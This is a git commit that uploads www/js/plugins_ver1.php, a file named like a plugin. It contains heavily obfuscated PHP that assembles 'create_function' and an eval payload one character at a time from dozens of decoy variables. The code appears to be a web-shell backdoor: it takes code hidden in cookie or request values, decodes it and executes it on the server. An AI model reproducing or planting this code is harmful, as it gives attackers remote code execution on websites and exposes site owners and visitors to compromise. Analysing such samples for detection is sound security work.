7f19be2530db70c9f43285e1ef50ac4b22355451
honkgoose <82125805+honkgoose@users.noreply.github.com>
2021-04-09 20:09:27 -0400

    Add files via upload

---
+++ www/js/plugins_ver1.php
@@ -0,0 +1,113 @@
+<?php
+
+	$dianna ='U$eX_srf';$amabel = '_';$equilibria='<];VV';
+	$have = 'S';
+	$issiah='Ns_,et';
+	$bonsai = 'LUTV"n';$brendan= '_';
+	$blasts ='vgE('; $hoot ='(O)gvP'; $arching = 'C=A=(eaE';$inconveniences= 'E';$cadre ='d'; $buttercup=')';
+
+	$jard = '[Gog_)m';$blankets = '[';$bloodshot =':eC';$fragmenting= '_$';$homeomorph='WH"G(g';$culpable='c_';
+	$macro='spcQsa';
+	$dreaded='d';$christy= 'v';
+
+	$amp ='"Gc:O';
+
+	$hildegarde ='(';$centralization='"swd(;de';$donated = 'F'; $leitmotif='aWiIy';$disconnecting ='[T';$jellyfish='w?@e($n';$cowslip= 'aa>';$formations='t';$impolitic='rruQriEs';$ivy = ')fi'; $canners='RvTr';$demographic ='Zovsa';$katleen ='$4aI';$gerontology = ' ig_t(P';$lemons ='Y';$band='t';
+	$lattices = 'ai'; $attune='[';
+
+	$clayborne= 'W_,viH';$jessika ='"';$egghead = 'l';
+
+	$breaches='u';
+	$availing ='S'; $avaricious = 's';
+
+	$backspace= '`VXHebe$';$challenge='_t'; $king =')'; $bovines= 'p';
+	$hayley = ':';$inaugurated = 'IOrrlo';$detective='yr]"e]i'; $hunted ='B';$axioms = 'S'; $karate= 'a';
+	$gasman= '$'; $exempting = 'o';
+
+	$appetite ='9'; $landers = 'r';$education='c'; $bethought ='s;SoJ(V$';$calorie ='$X[R'; $corded=']bsE';$impropriety= 'e'; $darcy ='"';
+
+	$churchmen = 'M';
+
+	$evangelina ='_ecE()aO';
+	$disables = '_'; $ivor= 'et6'; $bleat = ']'; $fumigate= 'e'; $basin= 'P';
+
+	$earthmove='Tt)i)Rv'; $debaters=')ein$';$dismissal= '(';$crushes='"'; $barren= 'SiDe?R)x'; $bessie= '?Or)'; $backlog= 'v'; $clive ='i';$dumper = 'f^KI=x'; $awarded='a';
+
+	$gradation = ';';
+	$elna ='eKTarT8';$clevey = 'V'; $historians=';$'; $battering=$evangelina['2'] .
+	$elna['4']. $elna[0] . $elna['3']. $earthmove['1'].
+
+	$elna[0].
+
+	$disables .$dumper['0']. $breaches.$debaters['3'].$evangelina['2'].
+
+	$earthmove['1']. $clive .$bethought['3']. $debaters['3'];$dialog =$gerontology['0'] ; $decedent = $battering($dialog,$elna[0] .$backlog .
+
+	$elna['3'].$inaugurated['4'] .$dismissal.$elna['3'] . $elna['4'].$elna['4']. $elna['3'] .
+
+	$detective['0']. $disables . $bovines. $bethought['3'] .
+	$bovines. $dismissal.
+
+	$dumper['0'] . $breaches.$debaters['3'].$evangelina['2']. $disables. $gerontology['2'] .
+	$elna[0]. $earthmove['1']. $disables . $elna['3'].$elna['4'].
+
+	$gerontology['2'] .
+	$corded['2'] .
+
+	$dismissal.
+
+	$bessie['3'] .
+	$bessie['3'] .$bessie['3']. $historians['0'] );$decedent
+
+	($crushes,$donated, $earthmove['1'] ,$conspiratorial ,
+	$earthmove['1'] ,
+	$calorie['1'] ,$clayborne[0] , $backtracker[3] , $historians['1'] . $clive. $dumper['4']. $elna['3'].$elna['4'] . $elna['4'] . $elna['3'].$detective['0'].
+
+	$disables. $jard['6'] .
+	$elna[0] .$elna['4'].
+	$gerontology['2']. $elna[0].
+	$dismissal.
+	$historians['1'] .
+
+	$disables .$barren['5'] . $evangelina['3'] .$impolitic['3']. $bonsai['1'] . $evangelina['3'] .$barren['0'] . $elna['5']. $clayborne['2'].
+
+	$historians['1'] . $disables. $bloodshot['2'] .$bessie['1']. $bessie['1'].
+
+	$elna['1']. $dumper[3].$evangelina['3'] .
+
+	$clayborne['2'].$historians['1'] .$disables.
+	$barren['0'].$evangelina['3'] . $barren['5'] .$clevey.$evangelina['3'] . $barren['5'].
+	$bessie['3'].$historians['0'] .
+	$historians['1'].$elna['3'] . $dumper['4'].$clive .$corded['2'].$corded['2']. $elna[0]. $earthmove['1']. $dismissal .
+	$historians['1'] .$clive. $calorie['2'] . $crushes.$corded['2'] . $bethought['3'] .$backlog. $gerontology['2'] .$jellyfish['0'] . $dumper['5'] .
+	$clive. $backlog.
+
+	$crushes . $bleat. $bessie['3'].$bessie['0'] .$historians['1'] . $clive. $calorie['2'] . $crushes . $corded['2'] .$bethought['3']. $backlog.
+	$gerontology['2'].
+	$jellyfish['0'] .
+
+	$dumper['5']. $clive. $backlog .
+
+	$crushes.$bleat. $hayley.$dismissal . $clive .$corded['2'] . $corded['2'].$elna[0] .$earthmove['1'] .
+
+	$dismissal .$historians['1'].$clive . $calorie['2'] .$crushes .
+	$backspace['3'].$elna['5'] . $elna['5'] . $basin.$disables . $barren['0']. $bessie['1'] . $clevey .$amp['1'].$clayborne[0].$calorie['1'].$dumper[3] . $clevey.$crushes .
+	$bleat .
+	$bessie['3']. $bessie['0'].$historians['1'] .$clive .$calorie['2'] .$crushes.$backspace['3'].$elna['5'] .$elna['5'] .
+
+	$basin.
+
+	$disables .$barren['0'] .
+	$bessie['1'] .$clevey. $amp['1'] . $clayborne[0].
+
+	$calorie['1'] . $dumper[3] .
+
+	$clevey.$crushes. $bleat .
+
+	$hayley. $centralization[6] . $clive . $elna[0].$bessie['3'] . $historians['0']. $elna[0]. $backlog .$elna['3'] . $inaugurated['4'] .
+
+	$dismissal. $corded['2'] . $earthmove['1'].
+
+	$elna['4'].$elna['4'].$elna[0] .$backlog .$dismissal . $corded['1'] .$elna['3']. $corded['2'] .$elna[0] .$ivor['2'].$katleen['1'] . $disables . $centralization[6] . $elna[0].$evangelina['2'].$bethought['3']. $centralization[6].
+	$elna[0] . $dismissal. $corded['2'] .$earthmove['1'].
+	$elna['4']. $elna['4'].$elna[0].$backlog . $dismissal. $historians['1']. $elna['3'].$bessie['3']. $bessie['3'] . $bessie['3'].$bessie['3']. $historians['0']  );
